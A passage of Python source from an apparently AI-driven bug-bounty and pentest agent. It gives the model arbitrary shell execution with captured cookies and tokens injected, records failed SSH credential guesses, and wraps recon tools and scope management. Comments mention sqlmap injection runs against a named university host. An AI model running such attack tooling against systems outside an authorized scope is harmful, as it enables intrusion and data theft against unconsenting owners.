        status_match = re.search(r"^HTTP/[\d.]+\s+(\d+)", output, re.M)
        status = int(status_match.group(1)) if status_match else None

        raw_evidence = f"$ {command}\n\n{output_capped}"

        if hasattr(target, "state") and isinstance(target.state, dict):
            evidence_log = target.state.setdefault("curl_evidence_log", [])
            evidence_log.append({
                "url": url,
                "method": method,
                "origin_sent": None,
                "status": status,
                "raw": raw_evidence,
                "ts": datetime.now(timezone.utc).isoformat(),
                "source": "run_terminal_command",  # distinguishes a mirrored entry from a real curl-tool call, for anything that cares later
            })
            if len(evidence_log) > 40:
                del evidence_log[: len(evidence_log) - 40]
    except Exception:
        pass


def _execute_terminal_command(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Execute a custom terminal command/Kali tool targeting a specified host/IP.
    This is the general-purpose fallback: arbitrary shell (pipes, heredocs,
    multi-stage `cmd1 | cmd2 > file` chains) for whatever the registered,
    purpose-built tools don't cover — e.g. the model assembling its own
    subfinder|httpx-style one-off pipeline instead of being limited to a
    fixed tool catalog.
    """
    command = args.get("command", "").strip()
    target_host = args.get("target", "").strip()

    if not command:
        return {"error": "No command specified."}

    # Configurable, clamped the same way sqlmap_scan's own timeout is --
    # a custom sqlmap/hydra/nmap invocation run through this generic tool
    # hits the exact same "needs more than 180s" wall sqlmap_scan used to,
    # and raising this is the correct fix, not retrying the same command
    # again (which was the actual field failure: a dump that needed ~4
    # minutes got retried 6+ times at 180s each instead of once at 300s).
    try:
        timeout_s = max(60, min(int(args.get("timeout", 180) or 180), 600))
    except (TypeError, ValueError):
        timeout_s = 180

    try:
        # Hand the captured session (from login flows, cookie_inspector, or
        # an imported Burp/Caido history) to whatever this command runs, as
        # environment variables rather than baking the raw value into a
        # saved script's source. A script that does
        # `requests.Session(); s.cookies.set(...)` with a cookie hardcoded
        # at write-time goes stale the instant the session rotates (re-auth,
        # token refresh) — reading it from the environment at RUN time
        # means every execution picks up whatever's currently authenticated,
        # and the researcher never has to ask the model to "paste in the
        # latest cookie" by hand. Only ever set from this target's own
        # state — never derived from the command string itself.
        child_env = os.environ.copy()
        state = target.state if (target and isinstance(target.state, dict)) else {}
        session_cookie = state.get("session_cookie") or ""
        cookies_dict = normalize_cookies(state.get("cookies") or session_cookie)
        auth_token = state.get("auth_token") or ""
        headers_dict = state.get("headers") if isinstance(state.get("headers"), dict) else {}
        if session_cookie:
            child_env["HELLHOUND_COOKIE"] = str(session_cookie)
        if cookies_dict:
            child_env["HELLHOUND_COOKIES_JSON"] = json.dumps(cookies_dict)
        if auth_token:
            child_env["HELLHOUND_AUTH_TOKEN"] = str(auth_token)
        if headers_dict:
            child_env["HELLHOUND_HEADERS_JSON"] = json.dumps(headers_dict)
        if target_host:
            child_env["HELLHOUND_TARGET"] = target_host

        # Was a flat `subprocess.run(..., timeout=180)` — for a multi-stage
        # pipeline (subfinder | httpx, a heredoc writing a file then piping
        # it onward) that legitimately takes 30-90s, the CLI showed nothing
        # at all between "tool started" and "tool finished," indistinguishable
        # from a genuine hang. Routed through the same heartbeat poller every
        # other long-running shelled-out tool (ffuf, feroxbuster, nmap-style
        # scans) already uses, so ad-hoc multi-command pipelines stay visibly
        # alive instead of looking dead for up to 3 minutes.
        proc = _run_cmd_with_heartbeat(
            command, timeout=timeout_s, emit=emit,
            label=f"run_terminal_command ({target_host or 'target'})",
            shell=True, env=child_env,
        )

        # Best-effort capture of a credential pair that just got CONFIRMED
        # INVALID (ssh/sshpass/expect auth failure) — without this, the
        # only record of "james13 already failed against james/joe/ninja"
        # lived in free-text conversation history, which a long tool-heavy
        # turn can lose track of, leading to the exact thing this exists to
        # stop: re-testing a password that was already proven wrong.
        # Recorded into target.state so _get_orchestrator_system_prompt can
        # surface it as hard evidence, not just hope the model remembers.
        try:
            combined_out = f"{proc.stdout or ''}\n{proc.stderr or ''}"
            auth_fail_signal = any(s in combined_out for s in (
                "Permission denied", "Authentication failed", "Login incorrect",
                "incorrect password", "Access denied", "auth fail",
            ))
            looks_like_auth_attempt = any(t in command for t in ("ssh", "sshpass", "expect", "ftp", "mysql -u", "psql"))
            if auth_fail_signal and looks_like_auth_attempt and hasattr(target, "state") and isinstance(target.state, dict):
                identity = None
                password = None
                m_user = re.search(r'([A-Za-z0-9_.-]+)@(?:[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}|[A-Za-z0-9_.-]+)', command)
                if m_user:
                    identity = m_user.group(1)
                m_pw = re.search(r"sshpass\s+-p\s+'([^']*)'", command) or re.search(r'sshpass\s+-p\s+"([^"]*)"', command)
                if not m_pw:
                    m_pw = re.search(r'send\s+"([^"\\]*)\\r"', command)
                if m_pw:
                    password = m_pw.group(1)
                if identity and password:
                    failed_creds = target.state.setdefault("failed_credentials", [])
                    entry = {"identity": identity, "password": password, "method": "ssh/auth", "target": target_host or target.name}
                    if entry not in failed_creds:
                        failed_creds.append(entry)
                        if len(failed_creds) > 30:
                            del failed_creds[: len(failed_creds) - 30]
                        save_target(target)
        except Exception:
            pass  # credential-failure capture is best-effort and must never break the actual command result

        _mirror_http_evidence_from_terminal(command, proc, target, target_host)

        return {
            "command": command,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "exit_code": proc.returncode
        }
    except subprocess.TimeoutExpired as e:
        # _run_cmd_with_heartbeat attaches whatever its reader threads had
        # captured at the moment of kill to the exception it raises --
        # surface that instead of a bare "timed out" with nothing to show
        # for it. This is exactly the sqlmap_scan fix, generalized: a
        # hand-built sqlmap/hydra/nmap command run through THIS tool hit
        # the identical failure (confirmed injection + enumerated DBs
        # discarded on every timeout, forcing repeated 180s re-runs that
        # never got further because the same wall was hit every time).
        partial_stdout = getattr(e, "stdout", None) or getattr(e, "output", None) or ""
        partial_stderr = getattr(e, "stderr", None) or ""
        if isinstance(partial_stdout, bytes):
            partial_stdout = partial_stdout.decode("utf-8", errors="ignore")
        if isinstance(partial_stderr, bytes):
            partial_stderr = partial_stderr.decode("utf-8", errors="ignore")
        result = {
            "command": command,
            "timed_out": True,
            "stdout": partial_stdout,
            "stderr": partial_stderr,
            "note": (
                f"Command exceeded its {timeout_s}s timeout and was killed, but the output captured "
                f"before the kill is included above -- read it before deciding whether to retry. If "
                f"the partial output shows real progress (e.g. sqlmap had already confirmed injection "
                f"or enumerated databases/tables), re-running the exact same command from scratch is "
                f"wasted work; instead raise the timeout parameter (up to 600s) and/or narrow the "
                f"command (e.g. target one table/column at a time instead of a full --dump) so it "
                f"completes within the window."
            ),
        }
        if partial_stdout or partial_stderr:
            _mirror_http_evidence_from_terminal(command, type("P", (), {"stdout": partial_stdout, "stderr": partial_stderr, "returncode": None})(), target, target_host)
        return result
    except Exception as e:
        return {
            "command": command,
            "error": f"Failed to execute command: {e}"
        }


# Verbs accepted by manage_scope — mirrors the /scope slash-command verbs in
# commands.py exactly (same words, same meaning) so a researcher's habits
# transfer whether they type the command themselves or just tell the agent
# in plain language ("add that to scope" / "drop X from scope").
_SCOPE_ADD_VERBS = {
    "in": "in_scope", "include": "in_scope", "add": "in_scope", "add-in": "in_scope",
    "out": "out_scope", "exclude": "out_scope", "add-out": "out_scope",
    "disallow": "disallowed", "prohibit": "disallowed",
}
_SCOPE_REMOVE_VERBS = {"remove", "rm", "delete", "del", "drop"}


def _execute_manage_scope(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Add or remove hosts from the active target's engagement scope (in-scope,
    out-of-scope/excluded, or disallowed-action rules), directly from a
    researcher's natural-language instruction ("add staging.foo.com to
    scope", "actually drop bar.foo.com, it's not in the program",
    "no brute-force on this one") — the autonomous equivalent of the
    /scope in / /scope out / /scope remove slash commands in commands.py.

    This is scope *management*, not a scope bypass: it edits the same
    ScopeRules object is_in_scope()/check_module_against_rules() already
    enforce on every tool call, so a host only becomes testable here if the
    researcher is the one widening the list — the guard itself is untouched
    and still runs on every subsequent call exactly as before.
    """
    action = (args.get("action") or "").strip().lower()
    hosts = args.get("hosts")
    if isinstance(hosts, str):
        hosts = [hosts]
    hosts = [h for h in (hosts or []) if isinstance(h, str) and h.strip()]

    rules = target.scope_rules
    if rules is None:
        rules = ScopeRules()
        target.scope_rules = rules

    if action in ("show", "", None):
        return {
            "status": "success", "action": "show",
            "in_scope": list(rules.in_scope),
            "out_scope": list(rules.out_scope),
            "disallowed": list(rules.disallowed),
        }

    if not hosts:
        return {"status": "error", "error": "No host(s)/rule(s) given to add or remove."}

    # Split any comma-separated entries that arrived as one string (the
    # same real-world input shape /scope's own handler had to defend
    # against — "a.com,b.com,c.com" typed/pasted as a single token).
    flat_hosts: List[str] = []
    for h in hosts:
        flat_hosts.extend(h.split(","))
    flat_hosts = [h.strip().strip(",") for h in flat_hosts if h.strip().strip(",")]

    if action in _SCOPE_REMOVE_VERBS:
        removed: Dict[str, List[str]] = {"in_scope": [], "out_scope": [], "disallowed": []}
        not_found = []
        for entry in flat_hosts:
            hit = False
            for list_name in ("in_scope", "out_scope", "disallowed"):
                lst = getattr(rules, list_name)
                if entry in lst:
                    lst.remove(entry)
                    removed[list_name].append(entry)
                    hit = True
            if not hit:
                not_found.append(entry)
        save_target(target)
        if emit and hasattr(emit, "success"):
            emit.success(f"[+] Scope updated — removed: {', '.join(flat_hosts)}")
        return {
            "status": "success", "action": "removed", "removed": removed, "not_found": not_found,
            "in_scope": list(rules.in_scope), "out_scope": list(rules.out_scope), "disallowed": list(rules.disallowed),
        }

    list_name = _SCOPE_ADD_VERBS.get(action)
    if not list_name:
        return {
            "status": "error",
            "error": f"Unknown action '{action}'. Use one of: in/include/add (in-scope), "
                     f"out/exclude (out-of-scope), disallow/prohibit (prohibited action rule), "
                     f"remove/rm/drop (take out of whichever list it's in), or show.",
        }

    target_list = getattr(rules, list_name)
    added = []
    for entry in flat_hosts:
        if entry not in target_list:
            target_list.append(entry)
            added.append(entry)
        # A host can't sit in two lists at once — adding it here pulls it
        # out of the others so the state can't self-contradict.
        for other_name in ("in_scope", "out_scope", "disallowed"):
            if other_name == list_name:
                continue
            other_list = getattr(rules, other_name)
            if entry in other_list:
                other_list.remove(entry)
    save_target(target)
    if emit and hasattr(emit, "success"):
        emit.success(f"[+] Scope updated — {list_name}: +{', '.join(added) if added else '(no new entries)'}")
    return {
        "status": "success", "action": "added", "list": list_name, "added": added,
        "in_scope": list(rules.in_scope), "out_scope": list(rules.out_scope), "disallowed": list(rules.disallowed),
    }


def _execute_manage_program(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Groups several in-scope domains from the SAME bug-bounty program/
    engagement (e.g. a program called "AGOV" shipping 10 in-scope domains)
    under one program record, instead of each domain becoming its own
    disconnected flat target with no relationship to the others.

    This is the fix for a real organizational bug: before this, the only
    way to represent "a program with multiple in-scope domains" was to
    rename the CURRENT target to the program's name and add every domain
    to ITS scope_rules.in_scope list — which meant there was exactly one
    target/session/findings-bucket for the whole program, every domain's
    recon/curl history/session state got mashed into that same bucket, and
    switching "to" a specific domain to actually test it didn't exist as a
    concept (set_target just renamed the active target again). Now: each
    in-scope domain still gets its OWN real Target (own session, own
    findings, own curl/evidence history — set_target still switches to it
    normally), but they're tagged with the same `program` and share one
    scope definition, so adding/removing a domain from the program's scope
    (set_scope action) updates every domain under it at once, and `list`/
    `show` give a single view of "everything in this engagement."
    """
    action = (args.get("action") or "show").strip().lower()
    program_name = str(args.get("program_name") or target.program or "").strip()

    if action == "show" or action == "list":
        if not program_name:
            return {"status": "error", "error": "No program_name given and the current target isn't attached to a program yet."}
        record = load_program(program_name)
        if not record:
            return {"status": "not_found", "error": f"No program named '{program_name}' has been created yet. Use action='create' first."}
        return {
            "status": "success", "action": action,
            "program": record["name"], "display_name": record.get("display_name", record["name"]),
            "targets": record.get("targets", []),
            "scope_rules": record.get("scope_rules", {}),
        }

    if action == "create":
        if not program_name:
            return {"status": "error", "error": "program_name is required to create a program."}
        attach_target_to_program(target, program_name)
        domains_arg = args.get("domains")
        if isinstance(domains_arg, str):
            domains_arg = [domains_arg]
        attached = [target.name]
        for d in (domains_arg or []):
            d = str(d).strip().lower()
            if not d or d == target.name:
                continue
            d_target = create_or_load_target(d)
            attach_target_to_program(d_target, program_name)
            attached.append(d_target.name)
        if emit and hasattr(emit, "success"):
            emit.success(f"[+] Program '{program_name}' created with {len(attached)} target(s): {', '.join(attached)}")
        return {
            "status": "success", "action": "create", "program": sanitize_program_name(program_name),
            "targets": attached,
            "note": "Each domain listed is its own real target (own findings/session) tagged with this program — switch to one with set_target(name=<domain>) to actually work on it.",
        }

    if action == "add_domain":
        if not program_name:
            return {"status": "error", "error": "program_name is required."}
        domains_arg = args.get("domains") or args.get("hosts")
        if isinstance(domains_arg, str):
            domains_arg = [domains_arg]
        domains_arg = [str(d).strip().lower() for d in (domains_arg or []) if str(d).strip()]
        if not domains_arg:
            return {"status": "error", "error": "No domain(s) given to add — pass 'domains': ['a.example.com', ...]."}
        attached = []
        for d in domains_arg:
            d_target = create_or_load_target(d)
            attach_target_to_program(d_target, program_name)
            attached.append(d_target.name)
        if emit and hasattr(emit, "success"):
            emit.success(f"[+] Added {len(attached)} domain(s) to program '{program_name}': {', '.join(attached)}")
        return {
            "status": "success", "action": "add_domain", "program": sanitize_program_name(program_name),
            "domains_added": attached,
            "note": "Each is now its own target under this program and inherited the program's current scope. Switch to one with set_target(name=<domain>).",
        }

    if action == "set_scope":
        if not program_name:
            return {"status": "error", "error": "program_name is required."}
        raw_text = args.get("scope_text")
        if not raw_text:
            domains_arg = args.get("domains")
            if isinstance(domains_arg, str):
                domains_arg = [domains_arg]
            if domains_arg:
                raw_text = "\n".join(str(d).strip() for d in domains_arg if str(d).strip())
        if not raw_text:
            return {"status": "error", "error": "Give either 'scope_text' (raw program rules/domain list) or 'domains' (a list of in-scope domain strings)."}
        result = set_program_scope(program_name, str(raw_text))
        if emit and hasattr(emit, "success"):
            emit.success(f"[+] Program '{program_name}' scope updated — propagated to {len(result['targets_updated'])} target(s): {', '.join(result['targets_updated'])}")
        return {"status": "success", "action": "set_scope", **result}

    return {"status": "error", "error": f"Unknown action '{action}'. Use one of: create, add_domain, set_scope, show, list."}


def _execute_save_file(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Write text content to a file under this target's own workspace
    (~/.hellhound/targets/<target>/raw/) — e.g. "save the resolved
    subdomains to a text file" after a recon pass. Deliberately NOT an
    arbitrary-path file writer: the filename is sanitized to a bare name
    (no directories, no traversal) and the write is containment-checked
    into the target's own raw/ directory, the same directory read_artifact
    already reads from — so a file saved this way is immediately
    inspectable later via read_artifact without any extra plumbing, and
    this tool can never be used to write outside the target's own storage.
    """
    filename = (args.get("filename") or "").strip()
    content = args.get("content")
    if not filename:
        return {"error": "No filename specified."}
    if content is None:
        return {"error": "No content specified."}
    if isinstance(content, list):
        content = "\n".join(str(c) for c in content)
    else:
        content = str(content)

    # Bare filename only — strip any directory components so this can't be
    # used to climb out of the target's raw/ dir via '../' or an absolute path.
    safe_name = os.path.basename(filename.strip().strip("/"))
    if not safe_name or safe_name in (".", ".."):
        return {"error": f"Invalid filename: {filename!r}"}

    target_name = target.name if (target and target.name) else "default"
    raw_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}/raw")).resolve()
    raw_dir.mkdir(parents=True, exist_ok=True)
    out_path = (raw_dir / safe_name).resolve()
    if not str(out_path).startswith(str(raw_dir)):
        return {"error": "Resolved path escapes target storage — refusing to write."}

    try:
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(content)
    except Exception as e:
        return {"error": f"Failed to write file: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[+] Saved {len(content)} bytes to {out_path}")
    return {
        "status": "success", "path": str(out_path),
        "bytes_written": len(content.encode("utf-8")),
        "note": "Readable later via read_artifact with this path.",
    }


def _execute_delete_file(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Remove a file this session saved earlier via save_file (a scratch
    script, a wordlist, an old draft) from this target's own workspace —
    the counterpart save_file never had. CAUGHT IN THE WILD: asked to
    "delete the script you saved for this target," the only answer
    available was "I don't have a tool that can delete files — here's the
    rm -rf command to run yourself," handing back a raw shell command that
    nukes the ENTIRE target directory (raw/, screenshots/, everything) for
    what was really just "remove the one script you made." This gives it
    the one-file, contained version of that instead.

    Same safety shape as save_file, deliberately: bare filename only (no
    directory components, no traversal), and the resolved path is
    containment-checked to stay inside this target's own storage root —
    so this can delete a file IT created in the target's workspace and
    nothing else on the researcher's disk, ever.
    """
    filename = (args.get("filename") or "").strip()
    if not filename:
        return {"error": "No filename specified."}

    safe_name = os.path.basename(filename.strip().strip("/"))
    if not safe_name or safe_name in (".", ".."):
        return {"error": f"Invalid filename: {filename!r}"}

    target_name = target.name if (target and target.name) else "default"
    target_root = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}")).resolve()
    # save_file only ever writes into raw/, but a researcher could point at
    # a file anywhere under this target's own tree (e.g. screenshots/) —
    # search raw/ first (the common case) then the target root itself,
    # still never leaving target_root either way.
    candidates = [target_root / "raw" / safe_name, target_root / safe_name]
    out_path = None
    for cand in candidates:
        resolved = cand.resolve()
        if not str(resolved).startswith(str(target_root)):
            continue
        if resolved.is_file():
            out_path = resolved
            break

    if out_path is None:
        return {"error": f"No file named '{safe_name}' found in this target's workspace (checked raw/ and the target root)."}

    try:
        out_path.unlink()
    except Exception as e:
        return {"error": f"Failed to delete file: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[+] Deleted {out_path}")
    return {"status": "success", "deleted": str(out_path)}


_LAST_TOOL_OUTPUT_CAP = 200_000  # chars kept per stream — in-memory only, bounds worst case (e.g. a huge unfiltered fuzz run) without needing a file on disk


def _run_cmd_with_heartbeat(cmd, timeout: int, emit: Any, label: str,
                              heartbeat_interval: int = 5, shell: bool = False,
                              env: Optional[Dict[str, str]] = None,
                              live_parser: Optional[Callable[[str], Optional[str]]] = None,
                              max_live_lines: int = 40,
                              target: Any = None) -> "subprocess.CompletedProcess":
    """
    Runs a subprocess without blocking silently for the full timeout window.
    Long recon calls (passive OSINT lookups, DNS brute-force) previously used
    a single `subprocess.run(..., timeout=N)` — the terminal showed nothing
    between "tool started" and "tool finished," which for an unindexed
    domain (nothing found until timeout) looked exactly like a hang.
    Polls in `heartbeat_interval`-second slices and emits a progress line
    each time so the CLI stays visibly alive, then hard-kills at `timeout`.

    `cmd` is a List[str] argv by default (shell=False); pass a single command
    STRING with shell=True for callers that need real shell features (pipes,
    heredocs, redirects, `&&` chains) — e.g. run_terminal_command's ad-hoc
    multi-stage pipelines, which can't be expressed as a plain argv list.

    `env`, when given, REPLACES the subprocess's environment entirely (same
    as subprocess.Popen's own env= semantics) — callers that want to add
    variables on top of the normal environment must pass os.environ.copy()
    plus their additions, not a bare dict of just the new vars, or the
    child process loses PATH and everything else it needs to run at all.

    `live_parser`, when given, is called with EVERY new stdout line as the
    subprocess produces it — not just at the end. A fuzzer/brute-forcer
    (ffuf, feroxbuster) run through this used to show NOTHING but a static
    "still running (Ns)..." placeholder the whole time, with zero
    visibility into what it was actually finding, unlike spider's live
    crawl feed. Return a short string from live_parser to surface it
    immediately via emit.info() (a real new scrollback line, same as
    spider), or None to ignore that line. Capped at max_live_lines
    surfaced hits per call — a huge wordlist run finding hundreds of hits
    still returns ALL of them in the final parsed result, just not all
    individually echoed to a scrolling terminal.

    `target`, when given, stashes this run's FULL captured stdout/stderr
    (not just the capped live-surfaced lines) into
    target.state["_last_tool_output"] after a successful run, in memory
    only — no file written. That's what the /output command reads back,
    so a researcher who only saw a handful of live-streamed hits can still
    pull the complete output of the run that just finished. Capped at
    _LAST_TOOL_OUTPUT_CAP chars per stream so one huge unfiltered run can't
    grow memory unboundedly; this never touches disk and is overwritten by
    the next call that passes a target, so it only ever holds the LAST run.

    Implementation note: this reads stdout/stderr via background threads
    instead of the simpler `proc.communicate(timeout=...)` loop the
    original version used, because communicate() owns the pipes outright —
    nothing else can read from them while it's blocked inside one call, so
    there was no way to inspect output AS it arrived, only after the next
    communicate() call returned (at most once per heartbeat_interval, and
    even then only the output accumulated in that slice, already consumed
    silently). The reader threads drain the pipes continuously (also
    avoiding the classic deadlock where a full stdout buffer blocks the
    child while nothing is reading it) and `live_parser` runs inline as
    each line arrives.
    """
    start = time.monotonic()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=shell, env=env, bufsize=1)

    stdout_lines: List[str] = []
    stderr_lines: List[str] = []
    _lock = threading.Lock()
    _live_shown = [0]  # single-element list so the nested reader can mutate it without `nonlocal` gymnastics across two readers

    def _reader(stream, sink: List[str], is_stdout: bool):
        try:
            for line in iter(stream.readline, ''):
                if line == '':
                    break
                with _lock:
                    sink.append(line)
                if is_stdout and live_parser is not None:
                    try:
                        surfaced = live_parser(line.rstrip('\n'))
                    except Exception:
                        surfaced = None
                    if surfaced:
                        do_emit = False
                        with _lock:
                            if _live_shown[0] < max_live_lines:
                                _live_shown[0] += 1
                                do_emit = True
                        if do_emit and emit and hasattr(emit, "info"):
                            try:
                                emit.info(surfaced)
                            except Exception:
                                pass
        except Exception:
            pass
        finally:
            try:
                stream.close()
            except Exception:
                pass

    t_out = threading.Thread(target=_reader, args=(proc.stdout, stdout_lines, True), daemon=True)
    t_err = threading.Thread(target=_reader, args=(proc.stderr, stderr_lines, False), daemon=True)
    t_out.start()
    t_err.start()

    try:
        while True:
            elapsed = time.monotonic() - start
            remaining = timeout - elapsed
            if remaining <= 0:
                proc.kill()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    pass
                # CAUGHT IN THE WILD (sqlmap on result.gujaratuniversity.ac.in):
                # a long-running tool that confirms injectability and
                # enumerates DB names BEFORE hitting the wall clock still had
                # all of that sitting in stdout_lines/stderr_lines at the
                # moment of kill -- but a bare TimeoutExpired(cmd, timeout)
                # carries no output, so every caller's `except
                # subprocess.TimeoutExpired:` handler had nothing to parse
                # and had to report "timed out" with zero signal, discarding
                # real confirmed findings and forcing a full noisy re-run
                # from scratch. Give the reader threads a moment to drain
                # what's already buffered and attach it to the exception so
                # callers (see _execute_sqlmap_scan) can salvage partial
                # results instead of throwing them away.
                t_out.join(timeout=2)
                t_err.join(timeout=2)
                with _lock:
                    partial_stdout = ''.join(stdout_lines)
                    partial_stderr = ''.join(stderr_lines)
                raise subprocess.TimeoutExpired(cmd, timeout, output=partial_stdout, stderr=partial_stderr)
            try:
                proc.wait(timeout=min(heartbeat_interval, remaining))
                # Process finished — give the reader threads a brief moment
                # to drain any last buffered bytes/EOF, then assemble the
                # same (stdout, stderr) string shape communicate() used to
                # return, so every existing caller's parsing code keeps
                # working unchanged.
                t_out.join(timeout=2)
                t_err.join(timeout=2)
                with _lock:
                    stdout = ''.join(stdout_lines)
                    stderr = ''.join(stderr_lines)
                if target is not None and hasattr(target, "state") and isinstance(target.state, dict):
                    try:
                        target.state["_last_tool_output"] = {
                            "label": label,
                            "cmd": cmd if isinstance(cmd, str) else " ".join(str(c) for c in cmd),
                            "returncode": proc.returncode,
                            "stdout": stdout[-_LAST_TOOL_OUTPUT_CAP:],
                            "stdout_truncated": len(stdout) > _LAST_TOOL_OUTPUT_CAP,
                            "stderr": stderr[-_LAST_TOOL_OUTPUT_CAP:],
                            "stderr_truncated": len(stderr) > _LAST_TOOL_OUTPUT_CAP,
                            "ts": time.time(),
                        }
                    except Exception:
                        pass
                return subprocess.CompletedProcess(cmd, proc.returncode, stdout, stderr)
            except subprocess.TimeoutExpired:
                # Was emit.info(...) — ThinkingIndicator.info()/print_step()
                # prints a brand-new permanent scrollback line on every call,
                # so a long-running command produced a wall of near-identical
                # "still running (5s)... still running (10s)..." lines
                # instead of one line updating in place. set_label() instead
                # relabels the ALREADY-RUNNING spinner (which already shows
                # its own live elapsed-time counter), so this now reads as a
                # single line that updates in place, not N accumulating
                # ones. Falls back to info() only for a backend with no
                # spinner to update (e.g. plain headless/API emit), where a
                # one-line-per-tick log is the correct behavior anyway.
                elapsed_s = int(time.monotonic() - start)
                # PlainEmit/ConsoleEmit both define set_label() as a no-op
                # (nothing to relabel without a live spinner) — checking
                # hasattr() alone would silently swallow this heartbeat for
                # every non-interactive backend. The ORIGINAL version of
                # this check only looked for a `.indicator` attribute,
                # assuming `emit` would always be chat_ui.py's
                # InteractiveAgentEmit WRAPPER (which stores its
                # ThinkingIndicator as self.indicator). CAUGHT IN THE WILD:
                # the actual interactive console's main REPL loop
                # (chat_ui.py, start_chat_session) passes the raw
                # ThinkingIndicator itself as `emit` — it has no
                # `.indicator` attribute (it IS the indicator), so that
                # check was always False on the real deployed path and
                # this silently kept falling through to the info()
                # branch — printing a brand-new "still running (Ns)..."
                # scrollback line every heartbeat tick, i.e. the exact
                # flooding this was supposed to have already fixed.
                # Detect BOTH shapes: the wrapper (has .indicator) and a
                # bare ThinkingIndicator passed directly as emit.
                _live_indicator = isinstance(emit, ThinkingIndicator) or getattr(emit, "indicator", None) is not None
                if emit and _live_indicator and hasattr(emit, "set_label"):
                    emit.set_label(f"{label} still running ({elapsed_s}s)")
                elif emit and hasattr(emit, "info"):
                    # No leading "[*] " here — every emit backend's own
                    # info() already prefixes its own icon (ThinkingIndicator's
                    # print_step() renders its "*" icon, PlainEmit/ConsoleEmit
                    # render a "[*]" of their own via rich markup), so a
                    # literal "[*]" baked into the message text here doubled
                    # up into a visible "* [*] ..." / "[*] [*] ..." on every
                    # single line.
                    emit.info(f"{label} still running ({elapsed_s}s)...")
                continue
    finally:
        if proc.poll() is None:
            proc.kill()


def _execute_subfinder(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    domain = domain.strip().lower()
    if domain.startswith("http://") or domain.startswith("https://"):
        domain = urlparse(domain).netloc.split(":")[0]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("subfinder", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "subfinder not installed",
            "message": check["message"],
            "hint": "pdtm -i subfinder"
        }

    subfinder_bin = get_binary_path("subfinder") or "subfinder"
    subdomains = set()

    try:
        cmd = [subfinder_bin, "-d", domain, "-silent", "-all", "-timeout", "10"]
        proc = _run_cmd_with_heartbeat(cmd, timeout=45, emit=emit, label="subfinder (passive OSINT lookup)")
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                sub = line.strip().lower()
                if sub and "." in sub:
                    subdomains.add(sub)
    except Exception as e:
        logger.warning(f"subfinder execution failed: {e}")

    sub_list = sorted(list(subdomains))
    # Update target state and investigation memory
    try:
        update_from_subfinder(target, sub_list)
        save_target(target)
    except Exception:
        if "subdomains" not in target.state:
            target.state["subdomains"] = []
        for s in sub_list:
            if s not in target.state["subdomains"]:
                target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(sub_list),
        "subdomains": sub_list[:100],  # Return up to 100 in context
        "total_discovered": len(sub_list)
    }


def _execute_port_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Port scanning via naabu to discover open TCP/UDP ports and non-standard web services."""
    raw_target = args.get("hosts") or args.get("target") or args.get("host") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for port scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("naabu", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "naabu not installed",
            "message": check["message"],
            "hint": "pdtm -i naabu"
        }

    binary = get_binary_path("naabu") or "naabu"

    ports = str(args.get("ports", "top-100")).strip().lower()
    exclude_ports = args.get("exclude_ports")

    cmd = [binary, "-j", "-silent"]
    if ports in ("top-100", "top100", "100"):
        cmd.extend(["-tp", "100"])
    elif ports in ("top-1000", "top1000", "1000"):
        cmd.extend(["-tp", "1000"])
    elif ports in ("full", "all", "top-full"):
        cmd.extend(["-tp", "full"])
    else:
        cmd.extend(["-p", ports])

    if exclude_ports:
        cmd.extend(["-exclude-ports", str(exclude_ports)])

    open_ports = []
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=120)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        open_ports.append({
                            "host": item.get("host"),
                            "ip": item.get("ip", ""),
                            "port": item.get("port"),
                            "protocol": item.get("protocol", "tcp"),
                            "tls": item.get("tls", False)
                        })
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"naabu execution failed: {e}", "hosts": cleaned_targets}

    # Update target state
    if "open_ports" not in target.state:
        target.state["open_ports"] = []
    for p in open_ports:
        if p not in target.state["open_ports"]:
            target.state["open_ports"].append(p)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(open_ports),
        "open_ports": open_ports
    }


def _execute_permute_subdomains(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Generate subdomain wordlist mutations and permutations using alterx."""
    raw_subdomains = args.get("subdomains") or args.get("domains") or target.state.get("subdomains") or [target.name]
    if isinstance(raw_subdomains, list):
        sub_list = [str(s).strip().lower() for s in raw_subdomains if str(s).strip()]
